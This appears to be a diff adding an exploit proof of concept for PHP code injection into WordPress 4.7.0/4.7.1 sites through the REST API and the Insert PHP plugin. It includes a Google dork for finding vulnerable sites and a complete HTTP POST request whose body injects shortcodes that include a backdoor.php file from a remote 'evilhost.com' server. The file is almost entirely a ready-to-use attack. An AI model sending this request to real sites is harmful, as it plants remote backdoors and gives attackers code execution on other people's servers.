@@ -1,0 +1,24 @@
+# Exploit Title: WordPress 4.7.0/4.7.1 Plugin Insert PHP -  PHP Code Injection
+# Exploit Author: sucuri.net @sucurisecurity
+# Date: 2017-02-09
+# Google Dork : inurl:/wp-content/plugins/insert-php/
+# Vendor Homepage: https://fr.wordpress.org/plugins/insert-php/
+# Tested on: MSWin32
+# Version: <3.3.1
+
+# Explanation : You Can Inject PHP Code INTO Pages via Wordpress REST API Vulnerability 
+
+# PoC :
+POST http://localhost.com/wp-json/wp/v2/posts/1234 HTTP/1.1
+Host: localhost.com
+User-Agent: Xploit
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.8
+Accept-Encoding: gzip,deflate,lzma,sdch
+Connection: keep-alive
+content-type: application/json
+
+{  "id": "1234ffff", "title": "by Hacker", "content": "[insert_php] include('http[:]//evilhost.com/file/backdoor.php'); [/insert_php][php] include('http[:]//evilhost.com/file/backdoor.php'); [/php]" }
+
+
+# Reference : https://blog.sucuri.net/2017/02/rce-attempts-against-the-latest-wordpress-rest-api-vulnerability.html
